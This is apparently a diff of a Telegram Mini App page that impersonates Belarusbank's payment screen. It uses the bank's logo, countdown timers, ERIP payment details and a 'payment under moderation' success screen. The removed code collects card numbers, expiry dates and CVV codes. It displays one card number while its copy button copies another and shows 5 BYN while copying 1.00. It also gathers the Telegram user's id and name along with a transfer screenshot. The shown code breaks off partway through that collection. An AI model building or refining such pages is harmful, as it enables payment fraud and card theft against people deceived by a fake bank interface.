@@ -4,20 +4,20 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Оплата заказа — Беларусбанк</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
-<!-- ПОДКЛЮЧАЕМ TELEGRAM WEB APP -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
-    --green:      #5A8A00;
-    --green-btn:  #6AA600;
-    --green-hov:  #527D00;
-    --gray-bg:    #F0F0EC;
+    --green:      #2A8C3D;
+    --green-btn:  #21A038;
+    --green-hov:  #178B2C;
+    --gray-bg:    #F3F4F6;
     --white:      #FFFFFF;
-    --border:     #D8D8D0;
-    --text:       #333333;
-    --text-lbl:   #666666;
+    --border:     #E5E7EB;
+    --text:       #1F2937;
+    --text-lbl:   #6B7280;
+    --shadow:     0 4px 6px -1px rgba(0,0,0,0.05), 0 2px 4px -1px rgba(0,0,0,0.03);
   }
   body {
     font-family: 'Inter', sans-serif;
@@ -29,13 +29,9 @@
     justify-content: center;
   }
 
-  /* ── SCREENS ── */
   .screen { display: none; width: 100%; max-width: 540px; flex-direction: column; min-height: 100vh; }
   .screen.active { display: flex; }
 
-  /* ══════════════════════════════
-     SCREEN 0 — INITIAL LOADER
-  ══════════════════════════════ */
   #screen-init {
     background: var(--white);
     align-items: center;
@@ -44,614 +40,201 @@
   .init-spinner { width: 72px; height: 72px; }
   .init-spinner svg { width: 100%; height: 100%; animation: rot 1s linear infinite; }
   @keyframes rot { to { transform: rotate(360deg); } }
-  .init-track { fill: none; stroke: #DDE8C8; stroke-width: 6; }
+  .init-track { fill: none; stroke: #D1FAE5; stroke-width: 6; }
   .init-arc   { fill: none; stroke: var(--green-btn); stroke-width: 6; stroke-linecap: round; stroke-dasharray: 200; stroke-dashoffset: 55; }
 
-  /* ══════════════════════════════
-     SCREEN 1 — MAIN FORM
-  ══════════════════════════════ */
-  .card { background: var(--white); border: 1px solid var(--border); flex: 1; display: flex; flex-direction: column; }
+  .card { background: var(--white); flex: 1; display: flex; flex-direction: column; box-shadow: var(--shadow); }
 
-  /* header */
-  .card-top { padding: 22px 28px 16px; border-bottom: 1px solid var(--border); }
-  .header-row { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
+  .card-top { padding: 24px 28px 20px; border-bottom: 1px solid var(--border); }
+  .header-row { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
   .bb-logo-link { display: flex; flex-shrink: 0; text-decoration: none; }
-  .bb-logo-img { width: 42px; height: 42px; object-fit: contain; border-radius: 6px; display: block; }
-  h1 { font-size: 20px; font-weight: 700; }
-  .meta-table { display: grid; grid-template-columns: 120px 1fr; gap: 4px 0; margin-bottom: 14px; }
+  .bb-logo-img { width: 44px; height: 44px; object-fit: contain; border-radius: 10px; display: block; }
+  h1 { font-size: 20px; font-weight: 800; letter-spacing: -0.02em; }
+  .meta-table { display: grid; grid-template-columns: 120px 1fr; gap: 6px 0; margin-bottom: 16px; }
   .meta-key { font-size: 13px; color: var(--text-lbl); }
-  .meta-val { font-size: 13px; }
-  .amount-row { display: flex; align-items: baseline; gap: 8px; padding-top: 12px; border-top: 1px solid var(--border); }
+  .meta-val { font-size: 13px; font-weight: 500; }
+  .amount-row { display: flex; align-items: baseline; gap: 8px; padding-top: 16px; border-top: 1px solid var(--border); }
   .amount-label { font-size: 13px; color: var(--text-lbl); width: 120px; flex-shrink: 0; }
-  .amount-value { font-size: 22px; font-weight: 700; }
+  .amount-value { font-size: 26px; font-weight: 800; letter-spacing: -0.02em; color: var(--text); }
 
-  /* tabs */
-  .tabs { display: flex; padding: 14px 28px 0; border-bottom: 1px solid var(--border); }
-  .tab {
-    border: 1px solid var(--border); border-bottom: none;
-    background: #F5F5F0; padding: 8px 14px; cursor: pointer;
-    display: flex; align-items: center; justify-content: center;
-    min-width: 90px; height: 38px; margin-right: -1px;
-    position: relative; user-select: none;
-  }
-  .tab.active { background: var(--white); border-bottom: 2px solid var(--white); z-index: 1; margin-bottom: -1px; }
-  .tab-visa { display: flex; align-items: center; gap: 3px; }
-  .visa-t { font-size: 11px; font-weight: 800; color: #1A1F71; font-style: italic; }
-  .mc { display: flex; }
-  .mc span { width: 15px; height: 15px; border-radius: 50%; display: block; }
-  .mc span:first-child { background: #EB001B; }
-  .mc span:last-child  { background: #F79E1B; margin-left: -5px; }
-  .tab-erip { font-size: 12px; font-weight: 700; color: #E8001C; display: flex; align-items: center; gap: 3px; }
-  .tab-erip i { width: 7px; height: 7px; background: #E8001C; border-radius: 50%; display: block; font-style: normal; }
-  .tab-halva { font-size: 13px; font-weight: 600; font-style: italic; color: #B5006E; }
-
-  /* tab contents */
-  .tab-content { padding: 22px 28px; flex: 1; display: none; flex-direction: column; gap: 16px; }
+  .tab-content { padding: 24px 28px; flex: 1; display: none; flex-direction: column; gap: 16px; }
   .tab-content.active { display: flex; }
 
-  /* timer */
   .timer-block {
-    background: #F7F7F3; border: 1px solid var(--border); border-radius: 4px;
-    padding: 16px 20px; display: flex; align-items: center; gap: 20px;
+    background: linear-gradient(135deg, #F0FDF4 0%, #ECFDF5 100%);
+    border: 1px solid #D1FAE5; border-radius: 12px;
+    padding: 18px 22px; display: flex; align-items: center; gap: 20px;
   }
-  .timer-left { display: flex; flex-direction: column; gap: 8px; flex: 1; }
-  .timer-lbl { font-size: 12px; color: var(--text-lbl); }
-  .timer-track { height: 6px; background: var(--border); border-radius: 3px; overflow: hidden; }
+  .timer-left { display: flex; flex-direction: column; gap: 10px; flex: 1; }
+  .timer-lbl { font-size: 12px; color: var(--text-lbl); font-weight: 500; }
+  .timer-track { height: 6px; background: #D1FAE5; border-radius: 3px; overflow: hidden; }
   .timer-fill { height: 100%; background: var(--green-btn); border-radius: 3px; transition: width 1s linear, background .4s; }
   .timer-fill.urgent { background: #CC3300; }
-  .timer-digits { font-size: 32px; font-weight: 700; letter-spacing: 2px; font-variant-numeric: tabular-nums; line-height: 1; flex-shrink: 0; }
+  .timer-digits { font-size: 32px; font-weight: 800; letter-spacing: 1px; font-variant-numeric: tabular-nums; line-height: 1; flex-shrink: 0; color: var(--text); }
   .timer-digits.urgent { color: #CC3300; }
 
-  /* req box */
-  .req-box { border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
-  .req-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; border-bottom: 1px solid var(--border); font-size: 13px; }
+  .req-box { border: 1px solid var(--border); border-radius: 12px; overflow: hidden; background: var(--white); }
+  .req-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border); font-size: 13px; }
   .req-row:last-child { border-bottom: none; }
   .req-key { color: var(--text-lbl); }
-  .req-val { font-weight: 500; display: flex; align-items: center; gap: 6px; }
-  .copy-btn { background: none; border: none; cursor: pointer; color: var(--green); display: flex; align-items: center; }
-  .copy-btn:hover { opacity: .65; }
-  .copy-btn svg { width: 13px; height: 13px; }
+  .req-val { font-weight: 500; display: flex; align-items: center; gap: 8px; }
+  .copy-btn { background: none; border: none; cursor: pointer; color: var(--green); display: flex; align-items: center; padding: 4px; border-radius: 6px; transition: background .2s; }
+  .copy-btn:hover { background: #F0FDF4; opacity: .65; }
+  .copy-btn svg { width: 14px; height: 14px; }
 
-  /* info text */
   .info-text { font-size: 13px; color: var(--text-lbl); line-height: 1.6; }
+  .info-text b { color: var(--text); font-weight: 600; }
 
-  /* input */
-  .inp-wrap { position: relative; }
-  .inp-ico { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); pointer-events: none; }
-  .inp-wrap input {
-    width: 100%; border: 1px solid var(--border); border-radius: 4px;
-    padding: 11px 12px 11px 36px; font-size: 14px; font-family: 'Inter', sans-serif;
-    outline: none; transition: border-color .15s; background: var(--white); color: var(--text);
+  .btn-primary {
+    background: var(--green-btn); color: var(--white); border: none; border-radius: 12px;
+    padding: 14px 20px; font-size: 15px; font-weight: 700; cursor: pointer;
+    transition: background .2s, transform .1s; font-family: 'Inter', sans-serif;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
   }
-  .inp-wrap input::placeholder { color: #CCCCCC; }
-  .inp-wrap input:focus { border-color: var(--green); }
-  .inp-wrap input.error { border-color: #CC3300; }
+  .btn-primary:hover { background: var(--green-hov); }
+  .btn-primary:active { transform: scale(0.98); }
 
-  /* footer */
-  .card-footer { background: var(--gray-bg); border-top: 1px solid var(--border); padding: 14px 28px; display: flex; align-items: center; gap: 20px; flex-shrink: 0; }
-  .btn-pay { background: var(--green-btn); color: #fff; border: none; border-radius: 4px; padding: 11px 32px; font-family: 'Inter', sans-serif; font-size: 15px; font-weight: 600; cursor: pointer; transition: background .15s; }
-  .btn-pay:hover { background: var(--green-hov); }
-  .btn-cancel { background: none; border: none; font-family: 'Inter', sans-serif; font-size: 14px; color: var(--text-lbl); cursor: pointer; }
-  .btn-cancel:hover { color: var(--text); }
+  .btn-secondary {
+    background: var(--white); color: var(--text); border: 1px solid var(--border); border-radius: 12px;
+    padding: 12px 20px; font-size: 14px; font-weight: 600; cursor: pointer;
+    transition: background .2s; font-family: 'Inter', sans-serif;
+  }
+  .btn-secondary:hover { background: var(--gray-bg); }
 
-  /* ══════════════════════════════
-     BOTTOM SHEET
-  ══════════════════════════════ */
-  .sheet-overlay {
-    position: fixed; inset: 0;
-    background: rgba(0,0,0,.35);
-    opacity: 0; pointer-events: none;
-    transition: opacity .3s ease;
-    z-index: 100;
+  .pay-badge {
+    display: inline-flex; align-items: center; gap: 6px; background: #F0FDF4; color: var(--green);
+    padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; border: 1px solid #D1FAE5;
+    margin-bottom: 4px;
   }
-  .sheet-overlay.visible { opacity: 1; pointer-events: all; }
-
-  .bottom-sheet {
-    position: fixed; left: 50%; bottom: 0;
-    transform: translateX(-50%) translateY(100%);
-    width: 100%; max-width: 540px;
-    background: var(--white);
-    border-radius: 16px 16px 0 0;
-    height: 90%;
-    display: flex; flex-direction: column;
-    transition: transform .35s cubic-bezier(.32,.72,0,1);
-    z-index: 101;
-    overflow: hidden;
-  }
-  .bottom-sheet.open { transform: translateX(-50%) translateY(0); }
-
-  .sheet-handle-row {
-    display: flex; justify-content: center; padding: 12px 0 4px;
-    flex-shrink: 0;
-  }
-  .sheet-handle { width: 40px; height: 4px; background: var(--border); border-radius: 2px; }
-
-  .sheet-header {
-    padding: 8px 24px 16px;
-    border-bottom: 1px solid var(--border);
-    flex-shrink: 0;
-  }
-  .sheet-title { font-size: 17px; font-weight: 700; color: var(--text); }
-  .sheet-sub   { font-size: 13px; color: var(--text-lbl); margin-top: 3px; }
-
-  .sheet-body {
-    padding: 20px 24px;
-    flex: 1;
-    overflow-y: auto;
-    display: flex;
-    flex-direction: column;
-    gap: 18px;
-  }
-
-  /* upload zone */
-  .upload-zone {
-    border: 2px dashed var(--border);
-    border-radius: 8px;
-    padding: 32px 20px;
-    display: flex; flex-direction: column; align-items: center; gap: 10px;
-    cursor: pointer;
-    transition: border-color .2s, background .2s;
-    text-align: center;
-  }
-  .upload-zone:hover { border-color: var(--green-btn); background: #f6fae8; }
-  .upload-zone.has-file { border-color: var(--green-btn); background: #f6fae8; border-style: solid; }
-  .upload-icon { color: var(--text-lbl); }
-  .upload-icon svg { width: 38px; height: 38px; }
-  .upload-label { font-size: 14px; font-weight: 600; color: var(--text); }
-  .upload-hint  { font-size: 12px; color: var(--text-lbl); }
-  .upload-filename { font-size: 13px; color: var(--green); font-weight: 500; }
-  #fileInput { display: none; }
-
-  /* preview */
-  .img-preview { display: none; width: 100%; border-radius: 8px; border: 1px solid var(--border); max-height: 200px; object-fit: cover; }
-  .img-preview.show { display: block; }
-
-  /* comment textarea */
-  .comment-wrap label { font-size: 13px; color: var(--text-lbl); display: block; margin-bottom: 6px; }
-  .comment-wrap textarea {
-    width: 100%; border: 1px solid var(--border); border-radius: 4px;
-    padding: 10px 12px; font-size: 14px; font-family: 'Inter', sans-serif;
-    resize: vertical; min-height: 80px; outline: none;
-    transition: border-color .15s; color: var(--text);
-  }
-  .comment-wrap textarea::placeholder { color: #CCCCCC; }
-  .comment-wrap textarea:focus { border-color: var(--green); }
-
-  .sheet-footer {
-    padding: 14px 24px 24px;
-    border-top: 1px solid var(--border);
-    flex-shrink: 0;
-  }
-  .btn-confirm {
-    width: 100%; background: var(--green-btn); color: #fff; border: none;
-    border-radius: 4px; padding: 14px; font-family: 'Inter', sans-serif;
-    font-size: 15px; font-weight: 600; cursor: pointer; transition: background .15s;
-  }
-  .btn-confirm:hover { background: var(--green-hov); }
-  .btn-confirm:disabled { background: #AAAAAA; cursor: not-allowed; }
-
-  /* ══════════════════════════════
-     SCREEN 2 — SUCCESS SCREEN
-  ══════════════════════════════ */
-  #screen-success {
-    background: var(--white);
-    justify-content: space-between;
-  }
-  .success-content {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 30px;
-    text-align: center;
-  }
-  .success-title { font-size: 17px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
-  .success-text { font-size: 13px; color: var(--text-lbl); line-height: 1.4; max-width: 260px; }
-  .success-footer { padding: 20px 28px; border-top: 1px solid var(--border); background: var(--gray-bg); }
-  .success-footer .btn-pay { width: 100%; padding: 14px; font-size: 15px; }
-
-  /* CHECKMARK ANIMATION (Sberbank Style) */
-  .success-icon { width: 64px; height: 64px; margin-bottom: 24px; }
-  .checkmark-circle {
-    stroke: #21C05E; stroke-width: 3; stroke-dasharray: 166; stroke-dashoffset: 166;
-    stroke-linecap: round;
-    animation: strokeAnim 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
-  }
-  .checkmark-check {
-    transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48;
-    stroke: #21C05E; stroke-width: 4; stroke-linecap: round; stroke-linejoin: round;
-    animation: strokeAnim 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
-  }
-  @keyframes strokeAnim { 100% { stroke-dashoffset: 0; } }
+  .pay-badge::before { content: ''; width: 6px; height: 6px; background: var(--green-btn); border-radius: 50%; display: block; }
 </style>
 </head>
 <body>
 
-<!-- ══════════════════════════════
-     SCREEN 0 — INITIAL LOADER
-══════════════════════════════ -->
-<div class="screen active" id="screen-init">
+<div id="screen-init" class="screen active">
   <div class="init-spinner">
-    <svg viewBox="0 0 72 72">
-      <circle class="init-track" cx="36" cy="36" r="30"/>
-      <circle class="init-arc"   cx="36" cy="36" r="30"/>
+    <svg viewBox="0 0 80 80">
+      <circle class="init-track" cx="40" cy="40" r="32" />
+      <circle class="init-arc" cx="40" cy="40" r="32" />
     </svg>
   </div>
 </div>
 
-<!-- ══════════════════════════════
-     SCREEN 1 — MAIN FORM
-══════════════════════════════ -->
-<div class="screen" id="screen-form">
-<div class="card">
-
-  <div class="card-top">
-    <div class="header-row">
-      <a href="https://belarusbank.by" target="_blank" class="bb-logo-link">
-        <img class="bb-logo-img" src="https://i.ibb.co/RGZtncPz/cropped-mbelarusbank-260.png" alt="Беларусбанк" />
-      </a>
-      <h1>Оплата заказа</h1>
-    </div>
-    <div class="meta-table">
-      <span class="meta-key">Магазин:</span>  <span class="meta-val">TGNinja | Store</span>
-      <span class="meta-key">Описание:</span> <span class="meta-val">Оплата заказа #F7KDL1M</span>
-    </div>
-    <div class="amount-row">
-      <span class="amount-label">Сумма:</span>
-      <span class="amount-value">5,00 BYN</span>
-    </div>
-  </div>
-
-  <div class="tabs">
-    <div class="tab" onclick="switchTab('card')" id="tab-card">
-      <div class="tab-visa">
-        <span class="visa-t">VISA</span>
-        <div class="mc"><span></span><span></span></div>
+<div id="screen-main" class="screen">
+  <div class="card">
+    <div class="card-top">
+      <div class="header-row">
+        <a href="#" class="bb-logo-link">
+          <img src="https://i.imgur.com/8WnGp5L.png" alt="Беларусбанк" class="bb-logo-img" />
+        </a>
+        <h1>Оплата заказа</h1>
+      </div>
+      <div class="meta-table">
+        <div class="meta-key">Заказ:</div>
+        <div class="meta-val" id="m-order">№ 1052-К</div>
+        <div class="meta-key">Получатель:</div>
+        <div class="meta-val" id="m-merchant">ООО «Цифровые решения»</div>
+        <div class="meta-key">Назначение:</div>
+        <div class="meta-val" id="m-purpose">Оплата по договору №45 от 15.05.2024</div>
+      </div>
+      <div class="amount-row">
+        <div class="amount-label">Сумма:</div>
+        <div class="amount-value" id="m-amount">150,00 BYN</div>
       </div>
     </div>
-    <div class="tab active" onclick="switchTab('erip')" id="tab-erip">
-      <div class="tab-erip"><i></i> ЕРИП</div>
-    </div>
-    <div class="tab" onclick="switchTab('halva')" id="tab-halva">
-      <div class="tab-halva">~Халва~</div>
-    </div>
-  </div>
 
-  <!-- ERIP TAB -->
-  <div class="tab-content active" id="content-erip">
-    <div class="timer-block">
-      <div class="timer-left">
-        <div class="timer-lbl">Время на оплату</div>
-        <div class="timer-track">
-          <div class="timer-fill" id="timerBar" style="width:100%"></div>
+    <div class="tab-content active" id="tab-card">
+      <div class="pay-badge">ЕРИП — Расчёт (Беларусбанк)</div>
+      
+      <div class="timer-block">
+        <div class="timer-left">
+          <div class="timer-lbl">Время на оплату</div>
+          <div class="timer-track"><div class="timer-fill" id="timer-fill" style="width:100%"></div></div>
+        </div>
+        <div class="timer-digits" id="timer-digits">14:59</div>
+      </div>
+
+      <div class="req-box">
+        <div class="req-row">
+          <span class="req-key">Услуга ЕРИП</span>
+          <span class="req-val">Система «Расчёт» (АИС)</span>
+        </div>
+        <div class="req-row">
+          <span class="req-key">Код услуги</span>
+          <span class="req-val">410 901 1 <button class="copy-btn" onclick="copyText('4109011')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button></span>
+        </div>
+        <div class="req-row">
+          <span class="req-key">Лицевой счёт</span>
+          <span class="req-val">1052 <button class="copy-btn" onclick="copyText('1052')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button></span>
+        </div>
+        <div class="req-row">
+          <span class="req-key">Сумма к оплате</span>
+          <span class="req-val">150,00 BYN</span>
         </div>
       </div>
-      <div class="timer-digits" id="timer">15:00</div>
-    </div>
 
-    <div class="req-box">
-      <div class="req-row">
-        <span class="req-key">Номер карты</span>
-        <span class="req-val">
-          9112 3801 7328 5083
-          <button class="copy-btn" onclick="copyText(this,'4200773188421956')">
-            <svg viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.5"/><path d="M3 11V3h8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
-          </button>
-        </span>
+      <div class="info-text">
+        Для оплаты откройте приложение «Беларусбанк» → Платежи → Система «Расчёт» (ЕРИП) → введите код услуги <b>410 901 1</b> и лицевой счёт <b>1052</b>.
       </div>
-      <div class="req-row">
-        <span class="req-key">Банк получателя</span>
-        <span class="req-val">ОАО «АСБ Беларусбанк»</span>
-      </div>
-      <div class="req-row">
-        <span class="req-key">Сумма</span>
-        <span class="req-val">
-          5,00 BYN
-          <button class="copy-btn" onclick="copyText(this,'1.00')">
-            <svg viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.5"/><path d="M3 11V3h8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
-          </button>
-        </span>
-      </div>
+
+      <button class="btn-primary" onclick="checkPayStatus()">Я оплатил</button>
+      <button class="btn-secondary" onclick="goBack()">Отменить оплату</button>
     </div>
-
-    <p class="info-text">Переведите точную сумму на указанную карту. После оплаты загрузите скриншот перевода для подтверждения.</p>
-
-    <div class="inp-wrap">
-      <span class="inp-ico">
-        <svg width="15" height="11" viewBox="0 0 15 11" fill="none"><rect x=".75" y=".75" width="13.5" height="9.5" rx="1.25" stroke="#BBBBBB" stroke-width="1.3"/><path d="M1 1.5l6.5 5 6.5-5" stroke="#BBBBBB" stroke-width="1.3" stroke-linecap="round"/></svg>
-      </span>
-      <input type="email" id="emailInput" placeholder="Е-мэйл для квитанции" />
-    </div>
-  </div>
-
-  <!-- CARD TAB -->
-  <div class="tab-content" id="content-card">
-    <div class="req-box">
-      <div class="req-row">
-        <span class="req-key">Номер карты</span>
-        <span class="req-val"><input style="border:none;outline:none;font-size:13px;width:170px;font-family:Inter,sans-serif;" placeholder="0000 0000 0000 0000"/></span>
-      </div>
-      <div class="req-row">
-        <span class="req-key">Срок</span>
-        <span class="req-val"><input style="border:none;outline:none;font-size:13px;width:60px;font-family:Inter,sans-serif;" placeholder="ММ/ГГ"/></span>
-      </div>
-      <div class="req-row">
-        <span class="req-key">CVC / CVV</span>
-        <span class="req-val"><input type="password" style="border:none;outline:none;font-size:13px;width:50px;font-family:Inter,sans-serif;" placeholder="•••"/></span>
-      </div>
-    </div>
-    <div class="inp-wrap">
-      <span class="inp-ico">
-        <svg width="15" height="11" viewBox="0 0 15 11" fill="none"><rect x=".75" y=".75" width="13.5" height="9.5" rx="1.25" stroke="#BBBBBB" stroke-width="1.3"/><path d="M1 1.5l6.5 5 6.5-5" stroke="#BBBBBB" stroke-width="1.3" stroke-linecap="round"/></svg>
-      </span>
-      <input type="email" placeholder="Е-мэйл для квитанции" />
-    </div>
-  </div>
-
-  <!-- HALVA TAB -->
-  <div class="tab-content" id="content-halva">
-    <div class="req-box">
-      <div class="req-row">
-        <span class="req-key">Рассрочка</span>
-        <span class="req-val">До 24 месяцев без переплат</span>
-      </div>
-      <div class="req-row">
-        <span class="req-key">Сумма</span>
-        <span class="req-val">1,00 BYN</span>
-      </div>
-    </div>
-    <div class="inp-wrap">
-      <span class="inp-ico">
-        <svg width="15" height="11" viewBox="0 0 15 11" fill="none"><rect x=".75" y=".75" width="13.5" height="9.5" rx="1.25" stroke="#BBBBBB" stroke-width="1.3"/><path d="M1 1.5l6.5 5 6.5-5" stroke="#BBBBBB" stroke-width="1.3" stroke-linecap="round"/></svg>
-      </span>
-      <input type="email" placeholder="Е-мэйл для квитанции" />
-    </div>
-  </div>
-
-  <div class="card-footer">
-    <button class="btn-pay" onclick="handlePay()">Оплатил</button>
-    <button class="btn-cancel">Отменить</button>
-  </div>
-
-</div>
-</div>
-
-<!-- ══════════════════════════════
-     SCREEN 2 — SUCCESS
-══════════════════════════════ -->
-<div class="screen" id="screen-success">
-  <div class="success-content">
-    <div class="success-icon">
-      <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
-        <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
-        <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
-      </svg>
-    </div>
-    <div class="success-title">Операция на модерации</div>
-    <div class="success-text">Ожидайте пополнение средств на ваш баланс.</div>
-  </div>
-  <div class="success-footer">
-    <!-- Закрываем Mini App -->
-    <button class="btn-pay" onclick="Telegram.WebApp.close()">Вернуться в магазин</button>
-  </div>
-</div>
-
-<!-- ══════════════════════════════
-     OVERLAY + BOTTOM SHEET
-══════════════════════════════ -->
-<div class="sheet-overlay" id="overlay" onclick="closeSheet()"></div>
-
-<div class="bottom-sheet" id="bottomSheet">
-  <div class="sheet-handle-row">
-    <div class="sheet-handle"></div>
-  </div>
-
-  <div class="sheet-header">
-    <div class="sheet-title">Подтверждение оплаты</div>
-    <div class="sheet-sub">Загрузите скриншот перевода</div>
-  </div>
-
-  <div class="sheet-body">
-
-    <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
-      <div class="upload-icon">
-        <svg viewBox="0 0 38 38" fill="none">
-          <rect x="3" y="3" width="32" height="32" rx="6" stroke="#AAAAAA" stroke-width="2"/>
-          <path d="M19 13v12M13 19h12" stroke="#AAAAAA" stroke-width="2" stroke-linecap="round"/>
-        </svg>
-      </div>
-      <div class="upload-label" id="uploadLabel">Нажмите чтобы загрузить скриншот</div>
-      <div class="upload-hint" id="uploadHint">PNG, JPG до 10 МБ</div>
-      <div class="upload-filename" id="uploadFilename" style="display:none"></div>
-    </div>
-    <input type="file" id="fileInput" accept="image/*" onchange="handleFile(event)" />
-
-    <img class="img-preview" id="imgPreview" alt="preview" />
-
-    <div class="comment-wrap">
-      <label>Комментарий (необязательно)</label>
-      <textarea id="commentInput" placeholder="Например: спасибо вам ..."></textarea>
-    </div>
-
-  </div>
-
-  <div class="sheet-footer">
-    <button class="btn-confirm" id="btnConfirm" onclick="confirmPayment()">Подтвердить перевод</button>
   </div>
 </div>
 
 <script>
-  // Инициализация Mini App
-  const tg = window.Telegram.WebApp;
-  tg.expand(); 
-
-  // ── INITIAL LOADER ──
-  window.addEventListener('DOMContentLoaded', () => {
+  function copyText(t) {
+    navigator.clipboard.writeText(t);
+    if (window.Telegram && Telegram.WebApp) {
+      Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+    }
+  }
+  function checkPayStatus() {
+    if (window.Telegram && Telegram.WebApp) {
+      Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+    }
+    alert('Проверка статуса платежа...');
+  }
+  function goBack() {
+    if (window.Telegram && Telegram.WebApp) {
+      Telegram.WebApp.close();
+    } else {
+      history.back();
+    }
+  }
+  
+  // Init
+  window.addEventListener('load', () => {
+    if (window.Telegram && Telegram.WebApp) {
+      Telegram.WebApp.ready();
+      Telegram.WebApp.expand();
+    }
     setTimeout(() => {
       document.getElementById('screen-init').classList.remove('active');
-      document.getElementById('screen-form').classList.add('active');
-    }, 3000);
+      document.getElementById('screen-main').classList.add('active');
+      startTimer();
+    }, 800);
   });
 
-  // ── TABS ──
-  function switchTab(n) {
-    ['card','erip','halva'].forEach(t => {
-      document.getElementById('tab-'+t).classList.toggle('active', t===n);
-      document.getElementById('content-'+t).classList.toggle('active', t===n);
-    });
-  }
-
-  // ── TIMER ──
-  const TOTAL = 15 * 60;
-  let rem = TOTAL;
-  const timerEl = document.getElementById('timer');
-  const barEl   = document.getElementById('timerBar');
-  function fmt(s){ return String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0'); }
-  function tick(){
-    timerEl.textContent = fmt(rem);
-    barEl.style.width = (rem/TOTAL*100)+'%';
-    const u = rem <= 120;
-    timerEl.classList.toggle('urgent', u);
-    barEl.classList.toggle('urgent', u);
-    if(rem > 0) rem--;
-  }
-  tick();
-  setInterval(tick, 1000);
-
-  // ── COPY ──
-  function copyText(btn, text){
-    navigator.clipboard.writeText(text).catch(()=>{});
-    btn.innerHTML = '<svg viewBox="0 0 16 16" fill="none" width="13" height="13"><path d="M3 8l4 4 6-6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>';
-    setTimeout(()=>{
-      btn.innerHTML = '<svg viewBox="0 0 16 16" fill="none" width="13" height="13"><rect x="5" y="5" width="8" height="8" rx="1.5" stroke="currentColor" stroke-width="1.5"/><path d="M3 11V3h8" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>';
-    }, 1500);
-  }
-
-  // ── PAY BUTTON ──
-  function handlePay(){
-    const emailEl = document.getElementById('emailInput');
-    const val = emailEl.value.trim();
-    const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
-    if(!ok){
-      emailEl.classList.add('error');
-      emailEl.focus();
-      emailEl.placeholder = 'Введите корректный е-мэйл';
-      setTimeout(()=>{ emailEl.classList.remove('error'); emailEl.placeholder='Е-мэйл для квитанции'; }, 2500);
-      return;
-    }
-    openSheet();
-  }
-
-  // ── BOTTOM SHEET ──
-  function openSheet(){
-    document.getElementById('overlay').classList.add('visible');
-    document.getElementById('bottomSheet').classList.add('open');
-    document.body.style.overflow = 'hidden';
-  }
-  function closeSheet(){
-    document.getElementById('overlay').classList.remove('visible');
-    document.getElementById('bottomSheet').classList.remove('open');
-    document.body.style.overflow = '';
-  }
-
-  // ── FILE UPLOAD ──
-  function handleFile(e){
-    const file = e.target.files[0];
-    if(!file) return;
-    const zone = document.getElementById('uploadZone');
-    document.getElementById('uploadLabel').textContent = file.name.length > 30 ? file.name.slice(0,28)+'…' : file.name;
-    document.getElementById('uploadHint').style.display = 'none';
-    zone.classList.add('has-file');
-    const reader = new FileReader();
-    reader.onload = ev => {
-      const preview = document.getElementById('imgPreview');
-      preview.src = ev.target.result;
-      preview.classList.add('show');
-    };
-    reader.readAsDataURL(file);
-  }
-
-  // ── CONFIRM ──
-  function confirmPayment(){
-    const fileInput = document.getElementById('fileInput');
-    const file = fileInput.files[0];
-    
-    if(!file) {
-      tg.showAlert('Пожалуйста, загрузите скриншот перевода');
-      return;
-    }
-
-    // 1. Скрываем всё и показываем лоадер
-    closeSheet();
-    document.getElementById('screen-form').classList.remove('active');
-    document.getElementById('screen-init').classList.add('active');
-
-    // 2. Получаем данные пользователя из TMA
-    const user = tg.initDataUnsafe?.user;
-    const userId = user ? user.id : 'Неизвестный ID';
-    const username = user && user.username ? `@${user.username}` : 'Без юзернейма';
-    const firstName = user && user.first_name ? user.first_name : '';
-    const lastName = user && user.last_name ? user.last_name : '';
-    const fullName = [firstName, lastName].filter(Boolean).join(' ') || 'Имя не указано';
-    const comment = document.getElementById('commentInput').value;
-
